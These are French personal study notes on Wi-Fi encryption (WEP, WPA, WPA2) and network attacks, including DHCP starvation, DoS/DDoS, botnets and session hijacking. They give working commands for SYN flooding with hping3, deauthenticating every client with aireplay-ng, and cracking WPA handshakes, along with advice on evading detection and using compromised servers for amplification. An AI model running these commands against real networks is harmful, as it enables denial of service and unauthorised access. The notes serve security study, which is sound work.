**Définition**

**Mode monitor** : Spécifique aux réseaux wireless, c'est un mode qui permet de capturer des paquets de n'importe quelle réseau à portée même s'ils ne sont pas destinés à cette inteface réseau.

**Mode promiscuité** : Spécifique au réseau filaire, c'est un mode qui permet de capturer tous les paquets d'un réseau local même si les paquets ne sont pas destinés à cette interface réseau.

**Sniffer** : C'est soit un software, soit un hardware avec directement un logiciel approprié pour fonctionner. Son but c'est d'intercepter le trafic sans le toucher ni créer de problèmes. Beaucoup fonctionne avec TCP/IP mais d'autre + sophistiqué peuvent fonctionner avec d'autre protocoles.
Quand tu run un sniffer, les défenseurs peuvent te ping pour savoir si tu run un sniffer ou pas. Si tu est en mode promiscuité, ta machine répondra au ping alors que si tu étais normal, tu n'aurai pas répondu. Donc faut bien penser à ça.
Y'a une autre technique aussi c'est que le défenseur lance un packet ARP en non-broadcast (donc que sur le suspect) qui demande une adresse pas importante. Si on est pas en mode promiscuité, on ne stocke pas l'adresse mac de la source car on s'en fout il nous est pas destiné. Par contre si on est en mode promiscuité, on va la stocké l'adresse mac source. Donc le défenseur va envoyé un ping broadcast avec une adresse mac spoofed. Tous ceux qui ne connaissent pas l'adresse ip ne pourront pas répondre sauf le sniffer car lui il connaitra l'adresse mac. Pour se protéger, on peut filtrer les ARP non diffusées qu'on reçoit pour ne pas répondre. On peut carrément configurer le sniffer pour ne pas répondre au pings broadcast avec des adresses MAC spoofed mais c'est utile que pour cette technique quoi.

**SSID :** Service Set Identifier, nom d'un access point. On utilise un beacon frame qui est broadcasté continuellement pour qu'on puisse savoir que le réseau wifi existe et donc de pouvoir s'y connecter. Par mesure de "sécurité", on peut ne pas faire apparaitre le SSID en broadcast donc il est comme invisible au yeux du public. Sauf que pas vraiment. Il envoie quand même des paquets pour dire qu'il est présent, y'a juste son nom qui est caché. Mais si on est en monitor mode, on voit les paquets qu'il émet donc on voit son nom. On peut donc s'y connecter de force.

**BSSID :** Mac adresse d'un access point.  

- **Canal 1 :** 2,412 GHz
- **Canal 6 :** 2,437 GHz
- **Canal 11 :** 2,462 GHz

**Wi-Fi Authentication Modes :** On a deux modes pour se connecter à un réseau wireless :

- Open Authentication :

![image.png](https://github.com/PavelSmerdiakov/Security-Notes/blob/main/open_authentication.jpg)

- Shared Key Authentication :

![image.png](https://github.com/PavelSmerdiakov/Security-Notes/blob/main/how_shared_key_authentication_works-f_mobile.png)  
**WEP Encryption :**

- ![image.png](https://github.com/PavelSmerdiakov/Security-Notes/blob/main/Screenshot_2025-02-05_20-07-06.png)
- Franchement c'est pas compliqué. L'IV c'est un nombre de 24 bits généré aléatoirement. La WEP Key (40 ou 104bits) c'est la clé que l'admin fournit manuellement au client quand il se connecte au réseau. Ensuite, elle est connue des deux coté donc on peut crypter/décrypter.
- On concatene l'IV et la WEP Key pour avoir la WEP Seed. On la passe ensuite dans l'algorithme RC4 pour avoir la Key Stream.
- D'un autre coté on a le plaintext et le CRC-32. Le CRC-32 c'est juste pour vérifier l'intégrité des données donc savoir si les données ont été modifiées ou non. Then on passe le plaintext dans CRC-32 et on obtient l'ICV qui est ensuite concatené au plaintext.
- Ensuite, on XOR la Key Stream avec la trame plaintext/ICV pour obtenir le Cipher text puis on le concatene avec l'IV car il est random et le destinataire doit pouvoir décrypter quand même le message.
- En gros, pour l'attaquant, il nous manque juste la WEP Key pour pouvoir décrypter tous le trafic qu'on capture.
- **Pour casser l'encryption WEP :**
    - Monitor the Access point channel.
    - Test Injection Capability to the Access point.
    - Use tool for Fake Authentication.
    - Sniff the packets using Wi-Fi Sniffing tools
    - Use Encryption tool to inject Encrypted packets.
    - Use the Cracking tool to extract the encryption key from IV.

**RC4 Algorithm :**

- On utilise 2 algorithme dedans :
    
- *KSA :*
    
    - procedure KSA  
        for i ← 0...N − 1 do . // Initialisation, i prend toute les valeurs de 0 à N-1. N c'est la longueur du tableau  
            S[i] ← i  
        end for  
        j ← 0  
        for i ← 0...N − 1 do . // Permutation, pour toute les valeurs du tableau S :  
            j ← (j + S[i] + K[i mod l]) mod N // j dépend de sa valeur précédente (j + S[i]). K[i mod l] où K est la clé en octet (WEP Key dans WEP par exemple), l c'est la longueur de la clé. Donc on prend le reste de la division de i par l et avec le résultat (qu'on va appeler p), on prend la p-1 valeur de la clé (car on commence à 0 dans l'indexation des caractère de la clé). ici, le mod N c'est pour permettre que n'importe quelle longueur de Key, le script sera valide. Car si on enleve mod N, on pourrai avoir un S[j] où j est plus grand que la longueur du tableau  
            Swap(S[i], S[j]) // Dans le tableau S, on échange la valeur à l'emplacement S[i] avec S[j].  
        end for  
        end procedure
- *PRGA :*
    
    - procedure PRGA  
        i ← 0 // initialisation  
        j ← 0  
        loop // generation loop  
            i ← (i + 1) mod n  
            j ← (j + S[i]) mod n  
            Swap(S[i], S[j])  
            k ← (S[i] + S[j]) mod n  
            Print(k) // output result  
        end loop  
        end procedure

**WPA Encryption :**

- TKIP :  
    ![image.png](https://github.com/PavelSmerdiakov/Security-Notes/blob/main/cwsp-tkip-03.png)
    
    - **TKIP :** Temporal Key Integrity Protocol c'est utilisé pour assurer la protection et le bon fonctionnement de l'authentification pendant l'encryption WPA. C'est pas un truc en particulier c'est juste les règles et implémentation dans l'encryption WPA.
    - **TSC :** Temporal Key Integrity Protocol Sequencer Counter, c'est un compteur sur 48 bits qui est initialisé à 1 à chaque fois que le Temporal Key (TK) est initialisé ou refreshed.
    - **MSDU :** Quand une donnée est envoyé sur la couche 3 (network), cette donné est appelé MSDU.
    - **MIC Key :** C'est une empreinte numérique attaché à la fin de la trame pour s'assurer de l'intégrité des données.
    - Processus :
        - Le TSC, TA, TK sont mixé ->WEP Seed qui est ensuite envoyé dans l'algo RC4 qui donnera la Key Stream.
        - Le IV et le EIV sont contenu directement dans le paquets final pour que le décryptage et le réassemblage se fassent correctement.
        - Le MSDU et la MIC Key est envoyé dans le Michael Algorithm puis l'output sera fragmentée en MPDU (MAC Protocol Data Unit, c'est un fragment des données de la trame en fait c'est logique). La TK est initialisée à chaque nouveau MSDU donc pour varier les paquets, c'est pour ça qu'on met le compteur TSC qui va s'incrémenté à chaque MPDU car il change plusieurs fois par MSDU.
        - À partir du MPDU, on calcule le ICV (Integrity Check Value) pour vérifier au moment du décryptage l'intégrité du paquets (en plus du MIC Key, c'est la même utilité c'est juste pas pour la même couche du modèle OSI).
        - Ensuite, le stream MPDU/ICV est XORé avec la Key Stream pour donner au final le Cipher text.

## **WPA2 Encryption :**

**CCMP / PSK :**

1. 1. **Message 1 (M1) :** Le point d'accès envoie un nonce (nonce AP) au client.
    2. **Message 2 (M2) :** Le client répond avec son nonce (nonce STA) et un groupe de clés (GTK) chiffré avec la clé de session du point d'accès.
    3. **Message 3 (M3) :** Le point d'accès confirme la réception des données du client et envoie son propre GTK chiffré avec la clé de session du client.
    4. **Message 4 (M4) :** Le client confirme la réception des données du point d'accès.

- Utilisation de l'algorythme AES en PSK (Pre-Shared Key) :
    - La création de la PMK (Pairwise Master Key) se fait avant le 4 way handshaking grâce à PBKDF2 :
        
        - Cette fonction prend en paramètre PRF (Pseudo-random Function, c'est une fonction de hashage comme par exemple SHA-1, SHA-256 ou encore HMAC-SHA1 pour WPA2), P (le password en octet), S (un salt en octet), c (nombre d'itération en entier positif) et dkLen (longueur de la derived key, la taille de la clé sortante quoi)
            
        - Explique si ça te change plus tard.
            
        - L'output de PBKDF2 c'est en fait la PSK si on l'avait pas déjà. Mais la PSK c'est la PMK donc l'output de la fonction c'est la PMK.
            
            [https://medium.com/@alonr110/the-4-way-handshake-wpa-wpa2-encryption-protocol-65779a315a64](https://medium.com/@alonr110/the-4-way-handshake-wpa-wpa2-encryption-protocol-65779a315a64 "https://medium.com/@alonr110/the-4-way-handshake-wpa-wpa2-encryption-protocol-65779a315a64")
            
    - Ensuite, le premier message du handshaking venant de l'AP donne l'Anonce (valeur aléatoire) ce qui va permettre au client la création de la PTK (Pairwise Transient Key pour chiffrer le trafic) et la GTK (Group Transient Key, pour chiffrer le trafic broadcast. Tout les devices du réseau ont la même GTK.) :
        
        - PTK = PMK + ANONCE + SNONCE + MAC(AA) + MAC(SA)
            
            ANONCE- is a random number that the AP has made.
            
            SNONCE- is a random number that the client has made.
            
            MAC(AA)- the mac address of the AP
            
            MAC(SA)- the mac address of the client
            
        - Mais c'est plutot noté : PTK = PRF-512(PMK, "Pairwise key expansion", MAC1||MAC2||Nonce1||Nonce2) car les fonctions PRF prennent trois paramètre, c'est pour ca qu'on concatene les mac et nonce.
            
        - GTK = PRF-256(GMK, "Group key expansion", MAC||GNonce)
            
    - Processus des fonctions PRF :
        
        - PRF-n(K,A,B)
            
            i = 0
            
            r = HMAC-SHA1(K,A|0|B|i) // askip le 0 c'est un octet nul qui permet de délimiter les différente partie de concaténation. Ca évite des risque de collision je crois.
            
            On stocke r dans une autre var R.
            
            on répète la meme ligne mais on aura incrémenter i de 1  (ca va tous changer car c'est HMAC-SHA1) puis on ajoute de nouveau r dans R (on concatene).
            
            la fonction HMAC-SHA1 produit une output de 160bits. donc on arrete quand on a atteint notre objectif de taille PTK. Pour la dernière concatenation de r dans R, y'aura des octets en trop mais on les degage juste.
            
            La taille de PTK dépend si on utilise TKIP (512 bits dans ce cas) ou CCMP (384bits)
            
        - [https://praneethwifi.in/2020/03/23/4-way-hand-shake-mic-verification-for-wpa3-owe-wpa2-pmf/](https://praneethwifi.in/2020/03/23/4-way-hand-shake-mic-verification-for-wpa3-owe-wpa2-pmf/ "https://praneethwifi.in/2020/03/23/4-way-hand-shake-mic-verification-for-wpa3-owe-wpa2-pmf/")
            
    - Avec la PTK et la GTK, on peut trouver :
        
        -  KCK = PTK bits 0-127, Key Confirmation Key used to provide data integrity during 4 Way Handshake & Group Key Handshake.
	        - KEK = PTK bits 128-255, Key Encryption Key used by EAPOL-Key frames to provide data privacy during 4-Way Handshake & Group Key Handshake.
			- TEK = PTK bits 256-383, the temporal encryption key used to encrypt & decrypt MSDU of 802.11 data frames between user device & access point (confidentiality of data)
            - Temporal MIC Authenticator Tx – 64-bit key used to compute message integrity key (MIC) - protects integrity of data frames transmitted by the AP to the user device
            - Temporal MIC Authenticator Rx – 64-bit key used to compute message integrity key (MIC) - protects integrity of data frames transmitted by the user device to the AP
			- GEK = GTK bits 0-127, the group encryption key for multicast traffic
			- GIK = GTK bits 128-255, the group integrity key for TKIP



    - Reste du 4-way handshaking :
        
        - Avec le MIC, le client va pouvoir envoyé le premier packet pour donnée le Snonce à l'AP. Il n'est pas encrypté mais le Snonce a le MIC attaché.
        - Quand l'AP le recoit, il peut donc calculer la PTK/GTK avec l'objet manquant (le Snonce) puis vérifier l'integrité avec le MIC reçu et le MIC généré.
        - Ensuite l'AP envoie un packet juste pour montrer au client qu'il connait le pmk. Ce packet contient des info pas hyper imoprtante mais encrypté et avec un MIC. Le client pourra donc vérifier la véracité de la communication. Enfin, le client envoie un packet pour dire que tout est bon et ils vont commencé à parler encrypté.
            
    - Fonctionnement de AES CTR (counter) :
        
        - En fait c'est pas le bon schéma mais c'est la même chose pour l'encryption en CTR mode en bas. Juste pas pour le MIC. C'est une autre méthode.
            
        - [https://mrncciew.com/2014/08/19/cwsp-ccmp-encryption-method/](https://mrncciew.com/2014/08/19/cwsp-ccmp-encryption-method/ "https://mrncciew.com/2014/08/19/cwsp-ccmp-encryption-method/")
            
        - Génération du counter :
            
            - Il est fait à partir du nonce (valeur random généré par session) et d'un counter initialisé à 0 qu'on va incrémenter de 1 à chaque fois :

```
`nonce                  counter 
9237AF71A232BC82E4 0000000000000001 // la ligne constitue l'Init Counter sur le schéma. 9237AF71A232BC82E4 0000000000000002 
9237AF71A232BC82E4 0000000000000003 
9237AF71A232BC82E4 0000000000000004 
... ... 
9237AF71A232BC82E4 EFFFFFFFFFFFFFFF 
9237AF71A232BC82E4 FFFFFFFFFFFFFF`
```

---

- La clé qu'on fout avec le counter et le nonce c'est la PMK.
    
- Dans le packet, ce counter est entre le MAC header et le payload encrypté. Il est donc dans le CCMP-header.
    
- Ensuite on calcule un MIC avec tout le packet (MAC-header +ccmp header + payload).
    
- Ensuite, le payload + le MIC sont encrypté avec le AES counter mode avec le counter qui se trouve dans le CCMP-header.
    
- Enfin, on ajoute le CCMP-header (pas chiffré) et le MAC-header (pas chiffré) au payload pour former le packet final.
    

![image.png](https://github.com/PavelSmerdiakov/Security-Notes/blob/main/Screenshot_2025-02-05_20-31-10.png)

Breaking WPA Encryption :

- Brute force le PSK (Pre-Shared Key c'est le password en gros).
- Capturer les paquets authentication handshaking WPA/WPA2 pour les cracker
- Déconnecter le client pour qu'il se reconnecte comme ca on capture le paquet authentication pour ensuite brute force le PMK ([https://fr.wikipedia.org/wiki/IEEE_802.11i](https://fr.wikipedia.org/wiki/IEEE_802.11i "https://fr.wikipedia.org/wiki/IEEE_802.11i"))

**ICMP Protocol :** Le protocole ICMP (Internet Control Message Protocol) **est un protocole de la couche réseau utilisé par les appareils du réseau pour diagnostiquer les problèmes de communication du réseau**. ICMP est principalement utilisé pour déterminer si les données atteignent ou non leur destination en temps voulu.

--- 

## **Attaques Réseau**

**Ethernet Attacks :**

**[https://www.linkedin.com/pulse/hacking-ethernet-cables-noob-village](https://www.linkedin.com/pulse/hacking-ethernet-cables-noob-village "https://www.linkedin.com/pulse/hacking-ethernet-cables-noob-village")**

**MAC Flooding :**

On envoie un grand nombre d'adresse mac random avec des adresses ip random dans le but de surcharger la CAM table du switch. Ca provoquera un débordement et le switch peut passer en mode "fail-open" où toutes les trames sont diffusées sur tous les ports au lieu d'un port spécifique. Sympa pour MITM. Pour ça, on peut utiliser macof sur kali linux.

- **Macof :**
    - `macof [-i interface] [-s source] [-d destination] [-e target-address] [-x TCP-source-port] [-y TCP-dest-port] [-n packets]`
    - Y'a pas beaucoup de commandes important parce qu'en fait on fait un truc assez général. On envoie juste plein de requête avec adresses source/destination random juste histoire de remplir la CAM table du switch.
    - `sudo macof -i eth0`

**Port stealing :**

C'est un mac spoofing sauf qu'il faut qu'on soit connecté en Ethernet au switch. On envoie un packet arp sur le réseau indiquant que ma machine attaquante utilise l'adresse MAC de la cible. Le switch va donc associé l'adresse MAC de la victime au port par lequel le packet est passé (notre port du coup). Donc on va recevoir tous les packets destinés à la victime et nous avec ettercap par exemple, on va rediriger le traffic vers la cible pour pas se faire repérer.

![image.png](file:///home/wpkaliuser/.config/joplin-desktop/resources/8c84eb81db1882457abb83895265b0b6.png) **DHCP Rappel :** Port UDP 67 pour server, UDP 68 pour client

**DHCP Snooping :**

Protection bien chiante pour les attaques en lien avec le DHCP. En gros, tout les nouveaux devices qui se connectent au réseau sont considéré comme untrusted. Ça signifie qu'il ne pourront pas envoyer de packets DHCPOffer ni de DHCPAcknowledgment. On ne pourra donc pas se faire passer pour le server DHCP auprès du client victime. Dans le processus de DHCP Discover, quand le server DHCP reçoit une requête légitime, il associe directement l'adresse MAC source à l'adresse IP qu'il va envoyer. Il n'attend pas la réponse du client. Ce combo d'adresse, il le met dans le binding table (élément important niveau sécurité).

**DHCP Spoofing :**

DHCP Snooping va te casser les couilles. En gros tu te fais passer pour la gateway. Ça peut passer par le DHCP Rogue Server.

**DHCP Starvation Attacks :**

Sache que la protection DHCP Snooping va t'emmerder de fou. L'attaquant génère un grand nombre de packets DHCP Discovery forgés avec des adresses MAC random. Le server DHCP va donc attribuer toute les adresses ip disponibles. Cela provoquera un déni de services étant donné que les nouveaux utilisateurs légitimes ne pourront avoir d'adresses ip sur le réseau. Pour ca, on peut utiliser Yersinia ou DHCPStarv (bof celui la).

En tant qu'attaquant, tu dois penser à plusieurs facteurs :

- évidemment les adresses MAC doivent être random
- Histoire de pas se faire spotted direct, n'envoie pas toute les requêtes d'un coup, joue sur le temps.
- Les TTL des DHCP packets doivent être différent pour chaque requêtes. Si tous les packets ont le même TTL, ils vont te prendre pour un con.
- Dans le cas où les FAI (fournisseurs d'accès internet) collabore avec l'entreprise, faut toujours penser à utiliser des proxies, un vpn ou même des zombies.
- À savoir que t'es obligé d'être sur le réseaux ciblé sinon tu peux pas toucher au server DHCP

![image.png](file:///home/wpkaliuser/.config/joplin-desktop/resources/10508469ee6f170817a75deeaab3a840.png)

**Rogue DHCP Server Attacks :** C'est un server DHCP introduit sur le réseau par un attaquant. Ça peut être combiné avec un DHCP Starvation pour niquer le server DHCP légitime et pour que les nouveaux client se connecte à notre Rogue DHCP server. C'est en fait un putain de point d'entré pour des attaques ultérieures. Parce que là tu contrôle totalement le traffic du réseau. Tu controles donc les logs donc sympa pour le forensic.

![image.png](file:///home/wpkaliuser/.config/joplin-desktop/resources/eaa5eb86af4b7fc33a053f92a2f99b42.png)  
**Tools pour l'analyse de packets :**

- **Wireshark**
- **Windump**
- **Snort**

![image.png](file:///home/wpkaliuser/.config/joplin-desktop/resources/139dc6b2e67ca1ebede60abe785634e8.png)

***DoS/DDoS :**  
[https://en.wikipedia.org/wiki/Denial-of-service_attack](https://en.wikipedia.org/wiki/Denial-of-service_attack "https://en.wikipedia.org/wiki/Denial-of-service_attack")

**DoS :** C'est un déni de service pour niquer le réseau en gros mais grâce à une seule machine (+/-)

**DDoS :** Pareil mais c'est avec plusieurs machines, généralement un botnet.  
**Catégorie d'attaques DoS/DDoS :**  
[https://easydmarc.com/blog/12-common-types-of-ddos-attacks-explained/](https://easydmarc.com/blog/12-common-types-of-ddos-attacks-explained/ "https://easydmarc.com/blog/12-common-types-of-ddos-attacks-explained/")  
[https://www.akamai.com/fr/glossary/what-is-application-layer-ddos-attack](https://www.akamai.com/fr/glossary/what-is-application-layer-ddos-attack "https://www.akamai.com/fr/glossary/what-is-application-layer-ddos-attack")

[https://www.imperva.com/learn/ddos/ip-fragmentation-attack-teardrop/](https://www.imperva.com/learn/ddos/ip-fragmentation-attack-teardrop/ "https://www.imperva.com/learn/ddos/ip-fragmentation-attack-teardrop/") sympa donc au cas où :

[fragmentation_dos_method](file:///home/wpkaliuser/.config/joplin-desktop/resources/c20498226a7187c7160870b9798f3f7d.bin "file:///home/wpkaliuser/.config/joplin-desktop/resources/c20498226a7187c7160870b9798f3f7d.bin")

- **Volumetric Attacks :**
    - C'est un déni de service qui envoie énormément de trafic pour consumer à mort la bande passante. C'est pour tous ralentir.
- **Fragmentation Attacks :**
    - C'est un déni de service dans lequel on fragmente de manière bizarre et malformé les packets. Le routeur va donc devoir les reassembler mais il va galerer et ca va consommer beaucoup de ressource.
    - On a trois type d'attaques par fragmentation :
        - **UDP and ICMP Fragmentation Attacks**
        - **TCP Fragmentation Attacks**
        - **UDP Flooding**
- **TCP-State-Exhaustion Attacks :**
    - C'est un déni de service principalement sur des services qui delivrent du contenu aux usagers en créant un nombre monstrueux de connexion TCP pour consommer un max de state tables (état des connexion TCP en gros c'est ca qui consomme des ressources).
    - Y'a plusieurs attaques possibles :
        - **SYN Flood**
            - Ça exploitre le three-way handshaking. On envoie beaucoup de requêtes SYN avec des fake IP sources. Donc la victime (server) va attendre l'acknowlegment (ACK) de l'ip qui n'existe pas donc il va attendre (jusqu'à 75 secondes) en "listen to queue". Dans la pratique c'est le plus simple à mettre en place.

![image.png](file:///home/wpkaliuser/.config/joplin-desktop/resources/7c906aeefb948f6d2fc806324f721725.png)

- **Metasploit :**
    - Y'a un script pour le faire dans metasploit directement (auxiliary/dos/tcp/synflood).
    - Tu peux mettre l'adresse de destination, le port de destination, l'adresse source. Par contre, par défaut les adresses ip sources sont toujours les mêmes donc faut le changer dans le script.
    - Si jamais le fichier lien bug, faut juste mettre la déclaration de p.ip.saddr dans la boucle while puis la définir sur une valeur random comme dans srchost.

[simple_synflood.rb](file:///home/wpkaliuser/.config/joplin-desktop/resources/79a1f5da97d1af6fba06aa3ebf053f9d.rb "file:///home/wpkaliuser/.config/joplin-desktop/resources/79a1f5da97d1af6fba06aa3ebf053f9d.rb")

- **Hping3 :**
    
    - Y'a Hping3 qui est plus efficace  que metasploit pour le synflood :
    - `hping3 ip_addr --flood -S -p port`
    - `hping3 website_target.com -d 120 -S -p 80 --flood --rand-source` où -d c'est la taille du packet
- **SSL/TLS Exhaustion**
    
- **DNS Query/NXDOMAIN Flooding**
    
- **Application Layers Attacks :**
    
    - C'est un déni de service sur la couche application d'un service. C'est fait par exemple en utilisant comme un goinfre une fonctionnalité d'une app.
    - Encore une fois y'a pas mal d'attaques :
        - **HTTP Flood**
        - **DNS Flood**
        - **Slowloris**
        - **SQL ?**
        - **XXE ?**
        - **HPP ?**
- **Technique général (emplacement temporaire) :**
    
    - **Bandwidth Attacks**
        - ![image.png](file:///home/wpkaliuser/.config/joplin-desktop/resources/f5e47375cd2fb4774657e6321c1767d7.png)
    - **Service Request Floods :**
        - Ça peut être un simple DoS où l'attaquant envoie un grand nombre de connexion TCP sur l'app Web ou le server Web.
    - **ICMP Flood :**
        - On envoie un nombre incalculable de ICMP Request pour faire consommer à la victime toute sa bande passante.
            
        - Smurf Attacks :
            
            - On envoie une requête ICMP en broadcast avec l'IP source de la cible.
            - On a donc tout les devices du réseau qui vont répondre à la cible ce qui va provoquer un DDoS.
            - Avec Ettercap :
                - Ajoute une cible puis lance le plugin smurf_attacks
            - Avec Hping3 :
        - Fraggle Attacks :
            
        - Ping of Death :
            
    - **P2P Attacks :**
        - Presque tous les server P2P utilise le client DC++. Les P2P DDoS Attacks exploitent des vulnérabilité DC++ pour compromettre le network. Donc tu peux créer un botnet à partir de ça puis lancer des DDoS sur ta vraie cible.
    - **Permanent DoS Attacks :**
        - - Au lieu de se faire chier sur le service, on va focus l'hardware pour qu'il soit inutilisable et doit être remplacé. Ça peut être fait en faisant du phlashing (corruption du firmware, hardware updates etc) pour "brick" un système.
    - **DrDoS :**
        - [https://www.nbs-system.com/publications/expertise/ddos-dos-drdos-comment-cela-fonctionne/](https://www.nbs-system.com/publications/expertise/ddos-dos-drdos-comment-cela-fonctionne/ "https://www.nbs-system.com/publications/expertise/ddos-dos-drdos-comment-cela-fonctionne/")
        - Y'a plusieurs victime dans cette attaque. On envoie des requêtes à un server intermédiaire victime qui va renvoyer une réponse à une deuxième victime qui va rediriger le trafic vers la cible. Les deux intermédiare c'est pour le spoofing. Cette attaques exploite le protocole UDP pour faire rebondir les paquets et donc faire du spoofing.
        - L'idée c'est d'amplifier les réponses émisent par les servers intermédiaire en demandant par exemple la liste de game en cours. On investie quelque petits octet pour recevoir (la cible) plusieurs kilo-octet voire méga-octet.
        - Pour que l'attaque soit ultra efficace, on peut utiliser des serveurs compromit (par nous) pour pouvoir utiliser la fibre entreprise et donc émettre beaucoup de requetes vers les servers intermédiaires.
- **DDoS/DoS Tools :**
    
    - Pandora DDoS Bot Toolkit
    - Derail
    - HOIC
    - DoS HTTP
    - BanglaDos
    - [https://github.com/topics/ddos-attack-tools](https://github.com/topics/ddos-attack-tools "https://github.com/topics/ddos-attack-tools")
- **Pour mobile :**
    
    - AnDOSid
    - Low Orbit Ion Cannon (LOIC)

**Méthodes de détection de DoS/DDoS :**

- **Activity Profiling :**
    - C'est l'analyse de packets et quand y'a beaucoup de packets avec les mêmes headers consécutifs, c'est détecté.
- **Wavelet Analysis :**
    - C'est l'analyse du signal réseau. Donc quand y'a beaucoup trop de trafic, c'est détecté.
- **Sequential Change-Point Detection :**
    - Le trafic est filtré par l'adresse ip, les port ciblé et les protocole. Un algorithme Cumulative Sum (CUSUM) est utilisé pour calcuer la variation du traffic attendu et le trafic réel. Si y'a un gros changement, c'est détecté.

Les contres-mesures :

- Protect secondary victims
- Detect and neutralize handlers
- Enabling ingress and egress filtering
- Deflect attacks by diverting it to honeypots
- Mitigate attacks by load balancing
- Mitigate attacks disabling unnecessary services
- Using Anti-malware
- Enabling Router Throttling
- Using a Reverse Proxy
- Absorbing the AttackIntrusion Detection Systems
- Intrusion Detection Systems

![image.png](file:///home/wpkaliuser/.config/joplin-desktop/resources/4396d684e39c86be0a87b09e5441a0b5.png)

***BotNet :**  
![image.png](file:///home/wpkaliuser/.config/joplin-desktop/resources/2650c78bf60424923a5b0c802081a694.png)  
**Propagation de malicious code pour botnet :**

- **Central Source Propagation :**
    - On a une source central qui contient le toolkit. Quand on exploite la machine vulnérable, on créer une connexion avec la centrale source qui va installer le toolkit sur la machine avec un transfère de fichier HTTP, FTP ou RPC. Ensuite, on pourra exploiter de nouveau une autre machine vulnérable et transférer de la machine compromise vers la nouvelle cible.
- **Back-Chaining Propagation :**
    - Un peu comme le Central Source Propagation sauf qu'on le installe le toolkit depuis notre machine attaquante.
- **Autonomous Propagation :**
    - On exploite une machine vulnérable, on copie le malicious code sur la cible puis on l'installe. Le toolkit va ensuite chercher d'autre machine vulnérable.

**Les BotNet Trojans connus :**  
Blackshades NET  
Cythosia Botnet and Andromeda Bot  
PlugBot

_**Hijacking :**_

- **Session Hijacking (Session Sniffing ou Session Sidejacking) :**
    
    - Un attaquant intercepte ou vole les identifiants de session d'un utilisateur authentifié, lui permettant de prendre le contrôle de la session.
    - Y'a trois technique principale :
        - **Stealing :**
            - Plusieurs technique de vol c'est un peu flou pour l'instant. Le stealing comprend le Referrer attack.
        - **Guessing :**
            - Tricks et techniques où on devine le session ID en observant les éléments qui varie, ceux qui ne varie pas, en calculant le session ID avec la séquence ou autre.
        - **Brute-Forcing :**
            - On teste toute les combinaisons de credentials. On le fait généralement quand on connait un peu la range des sessions ID.
    - Processus complet :
        - **Sniffing and Monitoring :**
            
            - On se place entre la cible et le server et on monitor le trafic.
            - Analyse de trafic :
                - FTP :
                    - La RFC959 exige dans le handshaking FTP de spécifier le mot de passe avec PASS en TEXTE CLAIR car Telnet ne chiffre pas les mots de passe. Donc on peut directement chercher des packets contenant PASS avec tshark :
                        - `tshark -r ch1.pcap | grep PASS`
                    - Ou dans wireshark avec le filtre :
                        - `ftp.request.command == "PASS"`
                    - Encore plus simple, on peut faire clique droit sur un packet interessant puis suivre le tcp stream.
                - HTTP :
                    - L'header Authorization: Basic spécifie les credentials en base64 sous la forme username:password
                - Bluetooth :
                    - Pour voir les infos des appareils du trafic, aller dans Wireless (en haut) puis équipements Bluetooth.
                    - Pour voir plus clairement les évènement et utilité des packets, Wireless puis Résumé Bluetooth HCI
                - POP3 :
                    - [https://repository.root-me.org/RFC/EN - rfc1939.txt](https://repository.root-me.org/RFC/EN%20-%20rfc1939.txt "https://repository.root-me.org/RFC/EN%20-%20rfc1939.txt") A la page 14/15/16, on nous dit qu'on utilise un timestampe (sous la forme <process-ID.clock@hostname> avec les <> inclut) suivi d'un password pour générer un digest en md5 qui nous est visible dans la commande APOP.
                    - On peut donc essayer de retrouver le password en bruteforce car on a déjà le timestampe :
                        - `hashcat -m 0 -a 7 hash.txt "timestampe" /rockyou.txt`
        - **Session Desynchronization :**
            
            - On casse la connexion entre les deux pour avoir le champ libre.
        - **Session ID :**
            
            - On prend le contrôle de la session en prédisant le session ID.
        - **Command Injection :**
            
            - Après avoir pris contrôle de la session, on fait ce qu'on veut.
    - Deux type de Session Hijacking :
        - **Active Attacks :**
            - On intercepte le trafic en direct et on injecte des packets dans la session authentifié pour que la cible soit déconnectée.
        - **Passive Attacks :**
            - C'est pareil sauf qu'on envoie pas de packets dans le trafic légitime, on écoute juste.
    - Les attaques sont aussi divisé par le niveau de couche du modèle OSI :
        - **Application Level :**
            - **Un Main in the Middle (MitM) :**
                - Tous passe par nous, c'est plus que du sniffing, c'est la dictature.
            - **Un Man in the Browser (MitB) :**
                - Il faut que le browser soit infecté par un Trojan. Ensuite, en utilisant l'interface DOM, on peut extraire toute les données qu'il envoie. Il ne détecte même pas notre présence.
            - **Les XSS, CSRF, Session Replay, Session Fixation**
        - **Network Level :**
            - **Blind Hijacking :**
                
                - On est capable de capturer seulement le trafic qui va de la cible au server.
            - **BGP Hijacking :**
                
            - **UDP Hijacking :**
                
                - Étant donné que y'a pas de protocole séquentielle comme en TCP, c'est simplement une course avec le server où tu dois reçevoir la requête de la cible en premier pour lui répondre rapidement.
            - **TCP/IP Hijacking :**
                
            - **RST Hijacking :**
                
                - On spoof l'adresse source et on envoie des packets TCP RST pour réinitialiser la connexion.
            - **Déauthentication Hijacking :**
                
                - On spoof l'adresse d'un client connecté à un réseau et on envoie un paquet de déauthentification (=/= TCP RST) à l'AP pour le déconnecter. A savoir que généralement, la déconnexion n'est active seulement durant l'attaque. Quand on arrete le script, le client se reconnecte automatiquement.
                - Contrairement au RST Hijacking, là c'est une attaque réseau Wifi donc qui peut fonctionner sur 802.11.
                    - On peut le faire avec aircrack-ng, plus précisément aireplay-ng :
                        - Se mettre en mode monitor
                            
                            - `sudo ifconfig eth0 down`
                            - `airmon-ng start wlan0`
                        - Chercher une victime
                            
                            - `airodump-ng wlan0mon`
                            - `airodump-ng -d BSSID_target -c 11 wlan0mon` où 11 est le channel utilisé par notre cible qu'on a vu avec la commande précédente. (dans la colonne CH)
                        - Déauthentifier la cible
                            
                            - `aireplay-ng -0 0 -a BSSID_rarget -c MAC_target wlanmon0` où -0 0 spécifie le mode de deauth
                            - `aireplay-ng --deauth 100000 -a BSSID_target wlan0mon` pour deauth tous le monde.
                - On peut donc se servir de ça pour craquer la clé WPA/WPA2 avec aircrack-ng :
                    - `airmon-ng start ath0`
                    - `airodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w out ath0` (switch to another console)  
                    - `aireplay-ng -0 5 -a 00:14:6C:7E:40:80 -c 00:0F:B5:AB:CB:9D ath0`  
                    - `aircrack-ng -w /path/to/dictionary out.cap` vas check comment la décryption fonctionne (y'a dans le livre aircrackng)
            - MITM  
                - IP Spoofing
                
                - Contre-mesures :  
                     Installation de IDS/IPS  
                     Utilisation des bon protocole sécurisé comme ssh, https...  
                     Utilisation de IPSec

